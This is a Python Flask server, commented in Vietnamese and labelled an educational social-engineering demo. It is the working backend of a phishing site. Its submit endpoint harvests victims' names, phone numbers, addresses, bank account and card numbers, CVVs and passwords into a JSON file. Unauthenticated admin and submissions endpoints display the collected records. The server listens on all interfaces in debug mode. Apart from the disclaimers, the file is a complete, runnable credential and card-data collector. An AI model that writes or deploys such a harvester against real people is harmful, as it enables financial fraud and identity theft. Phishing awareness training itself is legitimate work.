#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Social Engineering Demo - Flask Web Server with HTTPS
Lưu dữ liệu vào JSON file
Chỉ sử dụng cho mục đích giáo dục và nghiên cứu bảo mật
"""

from flask import Flask, render_template, send_from_directory, request, jsonify
import os
import ssl
import json
from datetime import datetime

app = Flask(__name__, 
            static_folder='.',
            template_folder='.')

# Cấu hình
HOST = '0.0.0.0'  # Cho phép truy cập từ mọi địa chỉ IP
PORT = 5000       # Cổng HTTP
HTTPS_PORT = 5443 # Cổng HTTPS

# JSON file để lưu dữ liệu
JSON_FILE = 'social_engineering_data.json'

# Log thông tin truy cập (chỉ để demo)
access_logs = []

def init_json_storage():
    """Khởi tạo JSON storage"""
    if not os.path.exists(JSON_FILE):
        initial_data = {
            'metadata': {
                'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'total_submissions': 0
            },
            'submissions': []
        }
        with open(JSON_FILE, 'w', encoding='utf-8') as f:
            json.dump(initial_data, f, ensure_ascii=False, indent=2)
        print("✅ JSON storage đã sẵn sàng")
    else:
        print("✅ JSON storage đã tồn tại")

def save_form_data(data, ip_address):
    """Lưu dữ liệu form vào JSON file"""
    # Đọc dữ liệu hiện tại
    with open(JSON_FILE, 'r', encoding='utf-8') as f:
        json_data = json.load(f)
    
    # Tạo ID mới (tăng dần)
    if json_data['submissions']:
        new_id = max(item['id'] for item in json_data['submissions']) + 1
    else:
        new_id = 1
    
    # Tạo submission mới
    new_submission = {
        'id': new_id,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'ip_address': ip_address,
        'full_name': data.get('fullName', ''),
        'phone': data.get('phone', ''),
        'email': data.get('email', ''),
        'address': data.get('address', ''),
        'bank_account': data.get('bankAccount', ''),
        'card_number': data.get('cardNumber', ''),
        'cvv': data.get('cvv', ''),
        'password': data.get('password', ''),
        'income': data.get('income', ''),
        'phone_usage': data.get('phoneUsage', '')
    }
    
    # Thêm vào đầu list (newest first)
    json_data['submissions'].insert(0, new_submission)
    
    # Cập nhật metadata
    json_data['metadata']['total_submissions'] = len(json_data['submissions'])
    json_data['metadata']['last_updated'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # Lưu lại file
    with open(JSON_FILE, 'w', encoding='utf-8') as f:
        json.dump(json_data, f, ensure_ascii=False, indent=2)
    
    return new_id

def get_all_submissions():
    """Lấy tất cả dữ liệu đã submit"""
    if not os.path.exists(JSON_FILE):
        return []
    
    with open(JSON_FILE, 'r', encoding='utf-8') as f:
        json_data = json.load(f)
    
    return json_data['submissions']

@app.route('/')
def index():
    """Trang chủ"""
    log_access('/', request.remote_addr)
    return send_from_directory('.', 'index.html')

@app.route('/<path:path>')
def serve_static(path):
    """Serve các file tĩnh (CSS, JS)"""
    log_access(path, request.remote_addr)
    return send_from_directory('.', path)

@app.route('/api/submit', methods=['POST'])
def submit_form():
    """
    Endpoint để nhận dữ liệu form (chỉ để demo)
    Trong thực tế, kẻ tấn công sẽ lưu dữ liệu này
    """
    data = request.get_json()
    ip_address = request.remote_addr
    
    # Lưu vào JSON
    try:
        submission_id = save_form_data(data, ip_address)
        
        # Log dữ liệu (chỉ để demo)
        print("\n" + "="*80)
        print("🚨 CẢNH BÁO DEMO: Dữ liệu đã được thu thập và LƯU VÀO JSON FILE")
        print("="*80)
        print(f"ID: {submission_id}")
        print(f"Thời gian: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"IP: {ip_address}")
        print(f"Email: {data.get('email', 'N/A')}")
        print(f"Phone: {data.get('phone', 'N/A')}")
        print(f"Bank Account: {data.get('bankAccount', 'N/A')}")
        print(f"Card Number: {data.get('cardNumber', 'N/A')}")
        print("="*80 + "\n")
        
        return jsonify({
            'status': 'success',
            'message': 'Dữ liệu đã được lưu vào JSON file (demo)',
            'id': submission_id
        })
    except Exception as e:
        print(f"❌ Lỗi khi lưu JSON: {e}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

@app.route('/api/logs')
def get_logs():
    """Xem log truy cập (chỉ để demo)"""
    return jsonify({
        'logs': access_logs[-50:]  # Chỉ hiển thị 50 log gần nhất
    })

@app.route('/api/submissions')
def get_submissions():
    """Lấy tất cả dữ liệu đã submit (chỉ để demo)"""
    try:
        submissions = get_all_submissions()
        return jsonify({
            'status': 'success',
            'total': len(submissions),
            'submissions': submissions
        })
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

@app.route('/admin')
def admin_panel():
    """Trang admin để xem dữ liệu đã thu thập (chỉ để demo)"""
    return send_from_directory('.', 'admin.html')

def log_access(path, ip):
    """Ghi log truy cập"""
    access_logs.append({
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'ip': ip,
        'path': path
    })
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {ip} -> {path}")

def create_self_signed_cert():
    """
    Tạo self-signed certificate cho HTTPS
    Chỉ sử dụng cho mục đích development/demo
    """
    cert_file = 'cert.pem'
    key_file = 'key.pem'
    
    # Kiểm tra xem đã có certificate chưa
    if os.path.exists(cert_file) and os.path.exists(key_file):
        print("✅ Đã tìm thấy certificate SSL")
        return cert_file, key_file
    
    try:
        # Tạo self-signed certificate bằng OpenSSL
        print("🔐 Đang tạo self-signed certificate...")
        os.system(f'openssl req -x509 -newkey rsa:4096 -nodes -out {cert_file} -keyout {key_file} -days 365 -subj "/C=VN/ST=HCM/L=HCM/O=Demo/CN=localhost"')
        
        if os.path.exists(cert_file) and os.path.exists(key_file):
            print("✅ Tạo certificate thành công")
            return cert_file, key_file
        else:
            print("❌ Không thể tạo certificate bằng OpenSSL")
            return None, None
    except Exception as e:
        print(f"❌ Lỗi khi tạo certificate: {e}")
        return None, None

def print_banner():
    """In banner thông tin"""
    banner = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║              🚨 SOCIAL ENGINEERING DEMO - WEB SERVER 🚨                      ║
║                                                                              ║
║  ⚠️  CẢNH BÁO: Trang web này chỉ dùng cho mục đích GIÁO DỤC                ║
║      KHÔNG sử dụng cho mục đích bất hợp pháp hoặc gây hại                  ║
║                                                                              ║
║  💾 Dữ liệu được lưu vào JSON file                                          ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""
    print(banner)

def main():
    """Khởi chạy web server"""
    print_banner()
    
    # Khởi tạo JSON storage
    init_json_storage()
    
    # Hỏi người dùng chọn HTTP hay HTTPS
    print("\n📋 Chọn chế độ chạy:")
    print("  1. HTTP  (Port 5000)")
    print("  2. HTTPS (Port 5443) - Yêu cầu OpenSSL")
    
    choice = input("\nNhập lựa chọn (1 hoặc 2, mặc định 1): ").strip()
    
    if choice == '2':
        # Chạy với HTTPS
        cert_file, key_file = create_self_signed_cert()
        
        if cert_file and key_file:
            print(f"\n🚀 Đang khởi động server với HTTPS...")
            print(f"\n📍 Truy cập trang web tại:")
            print(f"   🔒 https://localhost:{HTTPS_PORT}")
            print(f"   🔒 https://127.0.0.1:{HTTPS_PORT}")
            print(f"   🔒 https://<your-ip>:{HTTPS_PORT}")
            print(f"\n⚠️  Lưu ý: Trình duyệt sẽ cảnh báo về certificate không tin cậy")
            print(f"   Nhấn 'Advanced' -> 'Proceed to localhost' để tiếp tục\n")
            print(f"📊 Xem logs tại: https://localhost:{HTTPS_PORT}/api/logs")
            print(f"🖥️  Admin panel: https://localhost:{HTTPS_PORT}/admin")
            print(f"💾 JSON file: {JSON_FILE}\n")
            print("🛑 Nhấn Ctrl+C để dừng server\n")
            
            # Tạo SSL context
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(cert_file, key_file)
            
            app.run(
                host=HOST, 
                port=HTTPS_PORT, 
                debug=True,
                ssl_context=context
            )
        else:
            print("\n❌ Không thể tạo certificate SSL")
            print("💡 Cài đặt OpenSSL hoặc chọn chạy với HTTP (option 1)")
    else:
        # Chạy với HTTP
        print(f"\n🚀 Đang khởi động server với HTTP...")
        print(f"\n📍 Truy cập trang web tại:")
        print(f"   🌐 http://localhost:{PORT}")
        print(f"   🌐 http://127.0.0.1:{PORT}")
        print(f"   🌐 http://<your-ip>:{PORT}")
        print(f"\n📊 Xem logs tại: http://localhost:{PORT}/api/logs")
        print(f"🖥️  Admin panel: http://localhost:{PORT}/admin")
        print(f"💾 JSON file: {JSON_FILE}\n")
        print("🛑 Nhấn Ctrl+C để dừng server\n")
        
        app.run(
            host=HOST, 
            port=PORT, 
            debug=True
        )

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n🛑 Server đã dừng. Cảm ơn bạn đã sử dụng!")
    except Exception as e:
        print(f"\n❌ Lỗi: {e}")

